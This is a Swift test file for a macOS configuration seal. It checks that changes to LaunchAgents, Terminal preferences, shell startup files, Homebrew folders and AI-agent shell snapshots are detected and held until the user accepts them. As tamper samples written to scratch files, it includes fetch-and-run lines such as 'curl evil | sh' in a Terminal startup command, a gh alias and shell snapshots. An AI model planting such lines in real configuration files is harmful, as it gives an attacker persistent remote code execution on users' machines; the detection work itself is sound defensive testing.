import Foundation
import Testing
@testable import VibeCore

/// The config seal's Mac list (`MacSealList`, the node on macOS's step 8): each row on a scratch home, the rows outside
/// a home under a scratch root (`outside:`), never the real ones; never the user's LaunchAgents, preferences or Homebrew.
struct MacSealListTests {
    let temp = Scratch()

    static let mac: ConditionTrait = .enabled(if: Platform.CodeIdentity.isAvailable, "the Mac's list; Linux's is LinuxSealList")

    func home() throws -> String {
        let url = temp.url("mac-seal-home")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url.resolvingSymlinksInPath().path
    }

    static func write(_ text: String, _ path: String) throws {
        try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
        try text.write(toFile: path, atomically: false, encoding: .utf8)
    }

    func write(_ text: String, _ path: String) throws { try Self.write(text, path) }

    /// Every fingerprint of `items`, by name ("nil" where one is nil: the seal would skip it).
    func prints(_ items: [ConfigSeal.Watched]) -> [String: String] {
        Dictionary(items.map { ($0.name, ConfigSeal.fingerprint($0) ?? "nil") }) { first, _ in first }
    }

    /// A property list written as Terminal's file (binary, or XML).
    static func writePlist(_ object: [String: Any], _ path: String, xml: Bool = false) throws {
        try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
        let data = try PropertyListSerialization.data(fromPropertyList: object, format: xml ? .xml : .binary, options: 0)
        // A new file renamed over the old, as cfprefsd writes it.
        let staged = path + ".staged"
        try data.write(to: URL(fileURLWithPath: staged))
        try #require(rename(staged, path) == 0)
    }

    /// Terminal's preferences as this Mac's are shaped (its keys measured, 2026-11-26), with `extra` merged in.
    static func terminal(_ extra: [String: Any] = [:], started: Double = 1_795_000_000, frame: String = "10 10 600 400") -> [String: Any] {
        var object: [String: Any] = [
            "Default Window Settings": "Basic", "Startup Window Settings": "Basic", "HasMigratedDefaults": true,
            "LastTerminalStartTime": Date(timeIntervalSince1970: started), "NSWindow Frame TTWindow Basic": frame,
            "Window Settings": ["Basic": ["name": "Basic", "type": "Window Settings", "ProfileCurrentVersion": 2.07,
                                          "Font": Data([1, 2, 3]), "columnCount": 120]],
        ]
        object.merge(extra) { $1 }
        return object
    }

    /// A write that keeps a file's size and mtime: contents changed in place, then the mtime put back. Only its ctime
    /// (which no one sets back) tells.
    func rewriteKeepingSizeAndTime(_ path: String) throws {
        var info = stat()
        try #require(lstat(path, &info) == 0)
        let mtime = Platform.Files.modified(info)
        let old = try Data(contentsOf: URL(fileURLWithPath: path))
        let new = Data(old.map { $0 == UInt8(ascii: "a") ? UInt8(ascii: "b") : UInt8(ascii: "a") })
        let handle = try #require(FileHandle(forWritingAtPath: path))
        handle.write(new)
        handle.closeFile()
        var times = [mtime, mtime]
        try #require(utimensat(AT_FDCWD, path, &times, 0) == 0)
    }

    /// An ACL entry added to `path` (`chmod +a`'s, through the ACL calls).
    static func addACL(_ path: String) throws {
        let acl = try #require(acl_from_text("!#acl 1\ngroup:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:allow:write,append\n"))
        defer { acl_free(UnsafeMutableRawPointer(acl)) }
        try #require(acl_set_file(path, ACL_TYPE_EXTENDED, acl) == 0, "acl_set_file: \(errno)")
    }

    /// The list's rows: the home's, the zsh files' sourced ones, and those outside under a scratch root.
    @Test(Self.mac) func theListHasTheMeasuredRows() throws {
        let home = try home()
        let outside = temp.url("mac-seal-outside").path
        try write(". \"$HOME/.cargo/env\"\n", home + "/.zshenv")
        let items = MacSealList.watched(home: home, uid: getuid(), outside: outside)
        let names = Set(items.map(\.name))
        for (relative, _) in MacSealList.homeEntries { #expect(names.contains("~/" + relative), "\(relative) listed") }
        for name in ["~/Library/LaunchAgents", "~/Library/LaunchAgents/dev.vibeswitcher.node.plist", "~/Library/Preferences/com.apple.Terminal.plist",
                     "~/.cargo/env", "/opt/homebrew/bin", "/opt/homebrew/sbin", "/var/db/xcode_select_link"] {
            #expect(names.contains(name), "\(name) listed: \(names.sorted())")
        }
        #expect(items.allSatisfy { $0.executes && ConfigSeal.executes(key: ConfigSeal.keyPrefix + $0.name) }, "every row executes")
        #expect(items.allSatisfy { ConfigSeal.isHome(key: ConfigSeal.keyPrefix + $0.name) }, "each is the node-wide seal's, not a team's")
        // No folder row is a `.folder`, which doesn't see a folder's mode.
        #expect(!items.contains { $0.kind == .folder })
        // Nothing the Mac's own list (`homeFiles`) watches is listed twice: the zsh files and git's config are there.
        #expect(names.isDisjoint(with: ConfigSeal.homeFiles.map { "~/" + $0.0 }))
        #expect(Set(items.map(\.name)).count == items.count)
        // Outside rows read under the root given, named by their own path.
        #expect(items.first { $0.name == "/opt/homebrew/bin" }?.path == outside + "/opt/homebrew/bin")
    }

    /// A scratch home reads nothing outside it; the account's own home would (`/opt/homebrew`, `/var/db`), here only
    /// named, never read.
    @Test(Self.mac) func aScratchHomeReadsNothingOutsideIt() throws {
        let home = try home()
        let items = MacSealList.watched(home: home, uid: getuid())
        #expect(items.count == MacSealList.homeEntries.count && !items.isEmpty, "the home's rows: \(items.map(\.name))")
        #expect(!items.contains { !$0.name.hasPrefix("~/") }, "\(items.map(\.name))")
        #expect(!items.contains { !$0.path.hasPrefix(home + "/") })
    }

    /// Every row detects each change its kind reads, and a change to one changes no other's: a file row its contents, a
    /// replaced file and a link put in its place; a listing row a rewrite keeping size and mtime, a replaced entry, a
    /// link, a mode and an ACL; an entries row an entry changed in place; the preferences row a hashed key. Absent,
    /// each hashes as absent, never nil.
    @Test(Self.mac) func everyRowDetectsAChange() throws {
        let home = try home()
        let outside = temp.url("mac-seal-outside").path
        try write("[ -f ~/.config/x/key.env ] && source ~/.config/x/key.env\n", home + "/.zshrc")
        let list = { MacSealList.watched(home: home, uid: getuid(), outside: outside) }
        let items = list()
        // Every row: the home's, the one sourced file, the outside ones (none left out of what follows).
        #expect(items.count == MacSealList.homeEntries.count + MacSealList.outsideEntries.count + 1 && !items.isEmpty, "\(items.map(\.name))")
        var before = prints(items)
        #expect(!before.values.contains("nil"), "a row the seal would skip: \(before.filter { $0.value == "nil" })")
        let change = { (item: ConfigSeal.Watched, what: String, body: () throws -> Void) in
            try body()
            let after = self.prints(list())
            #expect(after[item.name] != before[item.name], "\(item.name): \(what) changed nothing")
            // A row inside another (the node's plist in the LaunchAgents folder) changes that one too, and only that one.
            let holders = Set(items.filter { item.path.hasPrefix($0.path + "/") }.map(\.name))
            for (name, printed) in before where name != item.name && !holders.contains(name) {
                #expect(after[name] == printed, "\(what) to \(item.name) changed \(name)")
            }
            before = after
        }
        for item in items {
            switch item.kind {
            case .file:
                try change(item, "created") { try self.write("one\n", item.path) }
                try change(item, "its contents") { try self.write("two\n", item.path) }
                try change(item, "a file renamed over it") {
                    try self.write("three\n", item.path + ".new")
                    try #require(rename(item.path + ".new", item.path) == 0)
                }
                try change(item, "a link to the same bytes put in its place") {
                    let copy = self.temp.url("link-target-\(UUID().uuidString)").path
                    try self.write("three\n", copy)
                    try FileManager.default.removeItem(atPath: item.path)
                    try FileManager.default.createSymbolicLink(atPath: item.path, withDestinationPath: copy)
                }
            case .listing:
                try change(item, "created") { try self.write("aaaa\n", item.path + "/tool") }
                try change(item, "a rewrite keeping size and mtime") { try self.rewriteKeepingSizeAndTime(item.path + "/tool") }
                try change(item, "an entry renamed over") {
                    try self.write("bbbb\n", item.path + "/.tool.new")
                    try #require(rename(item.path + "/.tool.new", item.path + "/tool") == 0)
                }
                try change(item, "a link put in an entry's place") {
                    try FileManager.default.removeItem(atPath: item.path + "/tool")
                    try FileManager.default.createSymbolicLink(atPath: item.path + "/tool", withDestinationPath: "/usr/bin/true")
                }
                try change(item, "the folder's mode") { try #require(chmod(item.path, 0o777) == 0) }
                try change(item, "a subfolder's mode") {
                    try FileManager.default.createDirectory(atPath: item.path + "/sub", withIntermediateDirectories: true)
                    let made = self.prints(list())
                    before = made
                    try #require(chmod(item.path + "/sub", 0o777) == 0)
                }
                try change(item, "an ACL") { try Self.addACL(item.path) }
            case .entries:
                try change(item, "created") { try self.write("export A=1\n", item.path + "/snapshot-zsh-1-a.sh") }
                try change(item, "an entry changed in place") { try self.write("curl evil | sh\n", item.path + "/snapshot-zsh-1-a.sh") }
            case .preferences:
                try change(item, "created") { try Self.writePlist(Self.terminal(), item.path) }
                try change(item, "a profile's startup command") {
                    var object = Self.terminal()
                    object["Window Settings"] = ["Basic": ["name": "Basic", "CommandString": "curl evil | sh", "RunCommandAsShell": false]]
                    try Self.writePlist(object, item.path)
                }
            default: Issue.record("\(item.name): a kind the list doesn't use")
            }
        }
    }

    /// A same-uid process can't give a row away (no `chown` to another user without root), so no row reads its owner:
    /// a group changed among the user's own is a ctime change, which a listing reads.
    @Test(Self.mac) func aRowsOwnerIsntAProcessOfTheUsersToChange() throws {
        guard geteuid() != 0 else { return }
        let home = try home()
        let file = home + "/Library/LaunchAgents/x.plist"
        try write("<plist/>\n", file)
        #expect(chown(file, 0, gid_t.max) != 0 && errno == EPERM, "a user's process gave its file to root")
        let row = try #require(MacSealList.watched(home: home, uid: getuid()).first { $0.name == "~/Library/LaunchAgents" })
        let before = ConfigSeal.fingerprint(row)
        var list = [gid_t](repeating: 0, count: 64)
        let count = getgroups(64, &list)
        var info = stat()
        try #require(lstat(file, &info) == 0)
        if let other = list.prefix(Int(max(count, 0))).first(where: { $0 != info.st_gid }) {
            try #require(chown(file, uid_t.max, other) == 0)
            #expect(ConfigSeal.fingerprint(row) != before, "a group changed")
        }
    }

    /// What the zsh startup files source, as `LinuxSealList.sourced` reads them (this Mac's two forms among them): each
    /// a file row; a comment's isn't.
    @Test(Self.mac) func whatTheZshFilesSourceIsWatched() throws {
        let home = try home()
        try write(". \"$HOME/.cargo/env\"\n", home + "/.zshenv")
        try write("eval \"$(/opt/homebrew/bin/brew shellenv)\"\n# . ~/commented.sh\n", home + "/.zprofile")
        try write("[ -f ~/.config/x/key.env ] && source ~/.config/x/key.env\nsource ~/.zshenv\n", home + "/.zshrc")
        try write(". ${HOME}/login.sh\n", home + "/.zlogin")
        let list = MacSealList.watched(home: home, uid: getuid())
        for name in ["~/.cargo/env", "~/.config/x/key.env", "~/login.sh"] {
            let item = try #require(list.first { $0.name == name }, "\(name)")
            #expect(item.kind == .file)
        }
        #expect(!list.contains { $0.name == "~/commented.sh" })
        // A startup file sourced by another is the Mac's own row already, not listed again.
        #expect(!list.contains { $0.name == "~/.zshenv" })
    }

    /// Off unless asked: the Mac's `homeWatched` and `watched` are today's (the app's seal), and asked, they are
    /// today's with the Mac list after.
    @Test(Self.mac) func theMacListIsOnlyWhereAsked() throws {
        let home = try home()
        let root = temp.url("repo").path
        try FileManager.default.createDirectory(atPath: root, withIntermediateDirectories: true)
        let today = ConfigSeal.homeFiles.map { "~/" + $0.0 } + ["~/.claude/settings.json's scripts", "~/.claude/settings.local.json's scripts"]
        #expect(ConfigSeal.homeWatched(home: home).map(\.name) == today)
        #expect(ConfigSeal.homeWatched(home: home, macList: false).map(\.name) == today)
        let mac = MacSealList.watched(home: home, uid: getuid()).map(\.name)
        #expect(ConfigSeal.homeWatched(home: home, macList: true).map(\.name) == today + mac)
        #expect(ConfigSeal.watched(home: home, root: root).map(\.name) == ConfigSeal.watched(home: home, root: root, macList: false).map(\.name))
        #expect(Set(ConfigSeal.watched(home: home, root: root, macList: true).map(\.name))
                == Set(ConfigSeal.watched(home: home, root: root).map(\.name)).union(mac))
        let hashed = ConfigSeal.hashes(home: home, root: root)
        #expect(mac.allSatisfy { hashed[ConfigSeal.keyPrefix + $0] == nil }, "a Mac row hashed without macList")
        #expect(mac.allSatisfy { ConfigSeal.hashes(home: home, root: root, macList: true)[ConfigSeal.keyPrefix + $0] != nil })
        #expect(MacSealList.namedByTheNode)
    }

    /// On Linux the list is empty whatever is asked: `homeWatched` is Linux's as before.
    @Test(.enabled(if: !Platform.CodeIdentity.isAvailable, "Linux's")) func theListIsEmptyOnLinux() throws {
        let home = try home()
        #expect(MacSealList.watched(home: home, uid: getuid(), outside: temp.url("o").path).isEmpty)
        #expect(ConfigSeal.homeWatched(home: home, macList: true).map(\.name) == ConfigSeal.homeWatched(home: home).map(\.name))
        #expect(!MacSealList.namedByTheNode)
    }

    // MARK: Terminal's preferences (`.preferences`)

    var terminalRow: ConfigSeal.Watched {
        get throws {
            let home = try home()
            return try #require(MacSealList.watched(home: home, uid: getuid()).first { $0.kind == .preferences })
        }
    }

    /// A Terminal start (`LastTerminalStartTime`) and a window move (`NSWindow Frame …`) change nothing, nor do the
    /// file's format and its keys' order; a profile's `CommandString`, Terminal's `Shell`, a key no one listed, a
    /// value's type and a nested value do.
    @Test(Self.mac) func aTerminalStartOrWindowMoveIsNoChangeButAStartupCommandIs() throws {
        let row = try terminalRow
        try Self.writePlist(Self.terminal(), row.path)
        let sealed = ConfigSeal.fingerprint(row)
        try Self.writePlist(Self.terminal(started: 1_795_100_000, frame: "30 30 800 500"), row.path)
        #expect(ConfigSeal.fingerprint(row) == sealed, "a Terminal start and a window move")
        try Self.writePlist(Self.terminal(["NSWindow Frame TTWindow Homebrew": "0 0 1 1"]), row.path)
        #expect(ConfigSeal.fingerprint(row) == sealed, "another window type's frame")
        try Self.writePlist(Self.terminal(), row.path, xml: true)
        #expect(ConfigSeal.fingerprint(row) == sealed, "the same values as XML")
        var profile = (Self.terminal()["Window Settings"] as? [String: Any])?["Basic"] as? [String: Any] ?? [:]
        profile["CommandString"] = "curl evil | sh"
        for (what, extra) in [("a profile's CommandString", ["Window Settings": ["Basic": profile]]),
                              ("Terminal's Shell", ["Shell": "/tmp/evil"]),
                              ("a key no one listed", ["TTAppPreferences Selected Tab": 1]),
                              ("a key that looks like churn", ["NSWindowFrame TTWindow Basic": "1 1 1 1"]),
                              ("a value's type", ["HasMigratedDefaults": 1]),
                              ("a nested value", ["Window Settings": ["Basic": ["name": "Basic", "type": "Window Settings", "ProfileCurrentVersion": 2.07,
                                                                                "Font": Data([1, 2, 4]), "columnCount": 120]]])] as [(String, [String: Any])] {
            try Self.writePlist(Self.terminal(extra), row.path)
            #expect(ConfigSeal.fingerprint(row) != sealed, "\(what) held nothing")
        }
        // The card says which key: the per-key hashes name it.
        try Self.writePlist(Self.terminal(["Window Settings": ["Basic": profile]]), row.path)
        let keys = MacSealList.preferenceKeys(row.path)
        try Self.writePlist(Self.terminal(), row.path)
        let was = MacSealList.preferenceKeys(row.path)
        #expect(Set(keys.keys).union(was.keys).filter { keys[$0] != was[$0] } == ["Window Settings"])
    }

    /// The churn left out is exactly the measured list: `LastTerminalStartTime` and the `NSWindow Frame ` keys.
    @Test(Self.mac) func theChurnLeftOutIsTheMeasuredList() {
        #expect(MacSealList.isChurn("LastTerminalStartTime") && MacSealList.isChurn("NSWindow Frame TTWindow Basic"))
        for key in ["NSWindowFrame TTWindow", "NSColorPanelMode", "TTAppPreferences Selected Tab", "TTInspector Selected Pane",
                    "Window Settings", "Shell", "lastTerminalStartTime", "NSWindow Frame"] {
            #expect(!MacSealList.isChurn(key), "\(key) left out")
        }
    }

    /// A link at the path (to the same bytes), an unreadable file, a file that isn't a property list, and a ByHost file
    /// appearing or going, or the ByHost folder unreadable: each a change, never nothing to compare.
    @Test(Self.mac) func aLinkUnreadableNonPlistOrByHostFileIsAChange() throws {
        let row = try terminalRow
        let byHost = (row.path as NSString).deletingLastPathComponent + "/ByHost"
        try Self.writePlist(Self.terminal(), row.path)
        let sealed = try #require(ConfigSeal.fingerprint(row))
        var seen: Set<String> = [sealed]
        let expectNew = { (what: String) in
            let now = ConfigSeal.fingerprint(row)
            #expect(now != nil, "\(what): nil, which the seal skips")
            #expect(!seen.contains(now ?? ""), "\(what) held nothing")
            if let now { seen.insert(now) }
        }
        let copy = temp.url("terminal-copy.plist").path
        try FileManager.default.copyItem(atPath: row.path, toPath: copy)
        try FileManager.default.removeItem(atPath: row.path)
        try FileManager.default.createSymbolicLink(atPath: row.path, withDestinationPath: copy)
        expectNew("a link to the same bytes")
        try FileManager.default.removeItem(atPath: row.path)
        try Self.writePlist(Self.terminal(), row.path)
        #expect(ConfigSeal.fingerprint(row) == sealed, "put back")
        try #require(chmod(row.path, 0) == 0)
        expectNew("unreadable")
        try #require(chmod(row.path, 0o600) == 0)
        try write("not a plist", row.path)
        expectNew("not a property list")
        try FileManager.default.removeItem(atPath: row.path)
        expectNew("absent")
        try Self.writePlist(Self.terminal(), row.path)
        #expect(ConfigSeal.fingerprint(row) == sealed)
        try FileManager.default.createDirectory(atPath: byHost, withIntermediateDirectories: true)
        expectNew("the ByHost folder made")
        let folderOnly = ConfigSeal.fingerprint(row)
        try Self.writePlist(["Shell": "/tmp/evil"], byHost + "/com.apple.Terminal.00000000-0000-0000-0000-000000000000.plist")
        expectNew("a ByHost file appearing")
        try Self.writePlist(["Shell": "/tmp/evil"], byHost + "/com.apple.Safari.00000000-0000-0000-0000-000000000000.plist")
        #expect(MacSealList.preferenceKeys(row.path).keys.allSatisfy { !$0.contains("Safari") }, "another app's ByHost file read")
        try FileManager.default.removeItem(atPath: byHost + "/com.apple.Terminal.00000000-0000-0000-0000-000000000000.plist")
        #expect(ConfigSeal.fingerprint(row) == folderOnly, "the ByHost file gone: a change from the seal that had it")
        try #require(chmod(byHost, 0) == 0)
        expectNew("the ByHost folder unreadable")
        try #require(chmod(byHost, 0o700) == 0)
        // The domain's own file absent: a ByHost file appearing is still a change (it isn't left behind the absent file).
        try FileManager.default.removeItem(atPath: row.path)
        let noFile = try #require(ConfigSeal.fingerprint(row))
        try Self.writePlist(["Shell": "/tmp/evil"], byHost + "/com.apple.Terminal.11111111-1111-1111-1111-111111111111.plist")
        #expect(ConfigSeal.fingerprint(row) != noFile, "a ByHost file appearing beside no domain file held nothing")
        #expect(ConfigSeal.hashes(of: [row])[ConfigSeal.keyPrefix + row.name] == ConfigSeal.fingerprint(row))
    }
}

/// The Mac list in the vault's look, held until the user's accept, through the same path as Linux's list
/// (`LeadVault.Book`'s `judge`, `checkConfig`): the fixture vault's scratch home (`book.configHome`), the book told it
/// is a checked Mac node host's (`watchesMacList`, which `HostServer` sets only for one).
struct MacSealVaultTests: LeadTeamFixture {
    let temp = Scratch()
    let vault: LeadVault
    init() { vault = Self.newVault(in: temp) }

    var home: String { book.configHome }

    func repo() throws -> String {
        let url = temp.url("lead")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        let root = url.resolvingSymlinksInPath().path
        for args in [["init", "-q", "-b", "main"], ["config", "user.email", "t@t"], ["config", "user.name", "T"]] { Git.run(args, in: root) }
        try "one\n".write(toFile: root + "/a.txt", atomically: true, encoding: .utf8)
        Git.run(["add", "a.txt"], in: root)
        Git.run(["commit", "-q", "-m", "first"], in: root)
        try FileManager.default.createDirectory(atPath: root + "/.vibeswitcher", withIntermediateDirectories: true)
        try "---\nmax_workers: 3\n---\n".write(toFile: root + "/.vibeswitcher/workflow.md", atomically: true, encoding: .utf8)
        return root
    }

    func write(_ text: String, _ path: String) throws { try MacSealListTests.write(text, path) }

    /// Every row there, as a Mac's home has them, so the seal records each as it is.
    func seedRows() throws {
        try write("<plist/>\n", home + "/Library/LaunchAgents/com.example.agent.plist")
        try write("<plist>start's</plist>\n", home + "/" + MacSealList.plist)
        try MacSealListTests.writePlist(MacSealListTests.terminal(), home + "/" + MacSealList.terminalPreferences)
        try write(". \"$HOME/.cargo/env\"\n", home + "/.zshenv")
        try write("export PATH=$HOME/.cargo/bin:$PATH\n", home + "/.cargo/env")
        try write("nvm\n", home + "/.nvm/nvm.sh")
        try write("aaaa\n", home + "/.nvm/versions/node/v22/bin/node")
        try write("v22\n", home + "/.nvm/alias/default")
        try write("tool\n", home + "/bin/tool")
        try write("aliases: {}\n", home + "/.config/gh/config.yml")
        try write("claude\n", home + "/.local/share/claude/versions/2.1.332")
        try FileManager.default.createDirectory(atPath: home + "/.local/bin", withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: home + "/.local/bin/claude", withDestinationPath: home + "/.local/share/claude/versions/2.1.332")
        try write("export A=1\n", home + "/.claude/shell-snapshots/snapshot-zsh-1-a.sh")
        try write("export A=1\n", home + "/.codex/shell-snapshots/snapshot-zsh-1-a.sh")
    }

    /// A team whose lead runs, its seal recorded by the app's look as the scratch home is now.
    func team() throws -> (root: String, lead: LeadVault) {
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        _ = try vault.checkConfig(root: root)
        #expect(try vault(for: runtime).checkConfig(root: root) == LeadVault.ConfigCheck())
        return (root, vault(for: runtime))
    }

    /// A change to each row is held; the user's accept takes it; the next look holds nothing; the next change to the
    /// same row is held again.
    @Test(MacSealListTests.mac) func aChangeToEachRowIsHeldUntilAcceptedThenTheNextAgain() throws {
        book.watchesMacList = true
        try seedRows()
        let (root, lead) = try team()
        let agents = "~/Library/LaunchAgents"
        // The node's plist is in the LaunchAgents folder: a change to it is both rows'.
        let held = { (name: String) in name == "~/" + MacSealList.plist ? [agents, name].sorted() : [name] }
        let changes: [(String, () throws -> Void, () throws -> Void)] = [
            ("~/Library/LaunchAgents", { try write("<plist>evil</plist>\n", home + "/Library/LaunchAgents/com.evil.agent.plist") },
             { try write("<plist>evil 2</plist>\n", home + "/Library/LaunchAgents/com.evil.agent.plist") }),
            ("~/" + MacSealList.plist, { try write("<plist>another job</plist>\n", home + "/" + MacSealList.plist) },
             { try write("<plist>a third</plist>\n", home + "/" + MacSealList.plist) }),
            ("~/" + MacSealList.terminalPreferences,
             { try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/tmp/evil"]), home + "/" + MacSealList.terminalPreferences) },
             { try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/tmp/evil2"]), home + "/" + MacSealList.terminalPreferences) }),
            ("~/.cargo/env", { try write("curl evil | sh\n", home + "/.cargo/env") }, { try write("curl evil2 | sh\n", home + "/.cargo/env") }),
            ("~/.nvm/nvm.sh", { try write("evil\n", home + "/.nvm/nvm.sh") }, { try write("evil2\n", home + "/.nvm/nvm.sh") }),
            ("~/.nvm/alias", { try write("v23\n", home + "/.nvm/alias/default") }, { try write("v24\n", home + "/.nvm/alias/default") }),
            ("~/bin", { try write("evil\n", home + "/bin/git") }, { try write("evil 2\n", home + "/bin/git") }),
            ("~/.local/bin", { try write("evil\n", home + "/.local/bin/swift") }, { try write("evil 2\n", home + "/.local/bin/swift") }),
            ("~/.local/share/claude/versions", { try write("evil\n", home + "/.local/share/claude/versions/2.1.332") },
             { try write("evil 2\n", home + "/.local/share/claude/versions/2.1.332") }),
            ("~/.config/gh", { try write("aliases:\n  co: '!curl evil | sh'\n", home + "/.config/gh/config.yml") },
             { try write("aliases:\n  co: '!curl evil2 | sh'\n", home + "/.config/gh/config.yml") }),
            ("~/.claude/shell-snapshots", { try write("curl evil | sh\n", home + "/.claude/shell-snapshots/snapshot-zsh-1-a.sh") },
             { try write("curl evil2 | sh\n", home + "/.claude/shell-snapshots/snapshot-zsh-1-a.sh") }),
        ]
        for (name, first, second) in changes {
            try first()
            #expect(try lead.checkConfig(root: root).held.sorted() == held(name), "\(name): a change not held")
            #expect(try lead.checkConfig(root: root).held.sorted() == held(name), "\(name): held at the next look too")
            #expect(try vault.checkConfig(root: root).resealed.sorted() == held(name), "\(name): the user's accept")
            #expect(try lead.checkConfig(root: root).held.isEmpty, "\(name): held after the accept")
            try second()
            #expect(try lead.checkConfig(root: root).held.sorted() == held(name), "\(name): the next change not held")
            _ = try vault.checkConfig(root: root)
        }
    }

    /// The accept a card passes back (its `shown` hashes, as `config accept` sends them) seals only what it showed: a
    /// change to the plist after the card was drawn is held again.
    @Test(MacSealListTests.mac) func anAcceptSealsOnlyWhatTheCardShowed() throws {
        book.watchesMacList = true
        try seedRows()
        let (root, lead) = try team()
        let name = "~/" + MacSealList.plist
        try write("<plist>another job</plist>\n", home + "/" + MacSealList.plist)
        #expect(Set(try lead.checkConfig(root: root).held) == [name, "~/Library/LaunchAgents"])
        let shown = ConfigSeal.heldHashes(in: try vault.guardedRecord(root: root))
        #expect(shown.keys.contains(ConfigSeal.keyPrefix + name), "\(shown.keys.sorted())")
        try write("<plist>changed after the card</plist>\n", home + "/" + MacSealList.plist)
        _ = try vault.checkConfig(root: root, shown: shown)
        #expect(Set(try lead.checkConfig(root: root).held) == [name, "~/Library/LaunchAgents"], "a change the card didn't show was sealed")
        let again = ConfigSeal.heldHashes(in: try vault.guardedRecord(root: root))
        _ = try vault.checkConfig(root: root, shown: again)
        #expect(try lead.checkConfig(root: root).held.isEmpty)
    }

    /// What writes the rows in ordinary use, as measured, holds nothing: a Terminal start and window move (cfprefsd's
    /// rewrite, renamed over), and a session's shell snapshot coming and going.
    @Test(MacSealListTests.mac) func ordinaryChurnHoldsNothing() throws {
        book.watchesMacList = true
        try seedRows()
        let (root, lead) = try team()
        try MacSealListTests.writePlist(MacSealListTests.terminal(started: 1_795_200_000, frame: "50 50 700 450"), home + "/" + MacSealList.terminalPreferences)
        #expect(try lead.checkConfig(root: root).held.isEmpty, "a Terminal start and a window move")
        try write("export B=2\n", home + "/.claude/shell-snapshots/snapshot-zsh-2-b.sh")
        try write("export B=2\n", home + "/.codex/shell-snapshots/snapshot-zsh-2-b.sh")
        #expect(try lead.checkConfig(root: root).held.isEmpty, "a session's snapshot added")
        try FileManager.default.removeItem(atPath: home + "/.claude/shell-snapshots/snapshot-zsh-2-b.sh")
        #expect(try lead.checkConfig(root: root).held.isEmpty, "a session's snapshot removed")
    }

    /// A row removed, or made unreadable, is held (it hashes as absent or unreadable, never left out), and the card says
    /// which.
    @Test(MacSealListTests.mac) func anUnreadableOrMissingRowFailsClosed() throws {
        book.watchesMacList = true
        try seedRows()
        let (root, lead) = try team()
        let plist = home + "/" + MacSealList.plist, terminal = home + "/" + MacSealList.terminalPreferences
        let agents = home + "/Library/LaunchAgents"
        for (name, path, mode) in [("~/" + MacSealList.plist, plist, 0o644), ("~/" + MacSealList.terminalPreferences, terminal, 0o600),
                                   ("~/.cargo/env", home + "/.cargo/env", 0o644)] as [(String, String, mode_t)] {
            // The plist's mode is its folder's row's too.
            let expected: Set<String> = path == plist ? [name, "~/Library/LaunchAgents"] : [name]
            try #require(chmod(path, 0) == 0)
            let held = Set(try lead.checkConfig(root: root).held)
            #expect(held == expected, "\(name) unreadable: held \(held.sorted())")
            // Put back: a file row is as sealed again, but a folder row holding it moved since it was held (the chmod's
            // ctime), and an accept seals only what was held as it was held: a look holds the folder anew, then the
            // accept takes it (the vault's rule for every watched thing, Linux's too).
            try #require(chmod(path, mode) == 0)
            _ = try lead.checkConfig(root: root)
            _ = try vault.checkConfig(root: root)
            #expect(try lead.checkConfig(root: root).held.isEmpty, "\(name): held after it was put back and accepted")
        }
        let saved = try Data(contentsOf: URL(fileURLWithPath: terminal))
        try FileManager.default.removeItem(atPath: terminal)
        #expect(try lead.checkConfig(root: root).held == ["~/" + MacSealList.terminalPreferences], "Terminal's file gone")
        #expect(ConfigSeal.heldChanges(in: try vault.guardedRecord(root: root))["~/" + MacSealList.terminalPreferences]?.contains("file") == true,
                "the card doesn't say the file")
        try saved.write(to: URL(fileURLWithPath: terminal))
        _ = try vault.checkConfig(root: root)
        try #require(chmod(agents, 0) == 0)
        defer { chmod(agents, 0o700) }
        #expect(try lead.checkConfig(root: root).held.contains("~/Library/LaunchAgents"), "the LaunchAgents folder unreadable")
    }

    /// A book that isn't a checked Mac node host's (the app's host, every scratch host: the default) watches none of
    /// it: its hashes are today's, and a change to a row holds nothing.
    @Test(MacSealListTests.mac) func aBookThatIsntANodeHostsWatchesNoneOfIt() throws {
        #expect(!LeadVault.Book().watchesMacList, "a new book watches the Mac list")
        #expect(!book.watchesMacList)
        try seedRows()
        let (root, lead) = try team()
        let record = try vault.guardedRecord(root: root) ?? [:]
        let mac = MacSealList.watched(home: home, uid: getuid()).map { ConfigSeal.keyPrefix + $0.name }
        #expect(mac.allSatisfy { record[$0] == nil }, "a Mac row recorded")
        try write("<plist>evil</plist>\n", home + "/Library/LaunchAgents/com.evil.agent.plist")
        try write("<plist>another job</plist>\n", home + "/" + MacSealList.plist)
        try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/tmp/evil"]), home + "/" + MacSealList.terminalPreferences)
        #expect(try lead.checkConfig(root: root).held.isEmpty)
    }
}
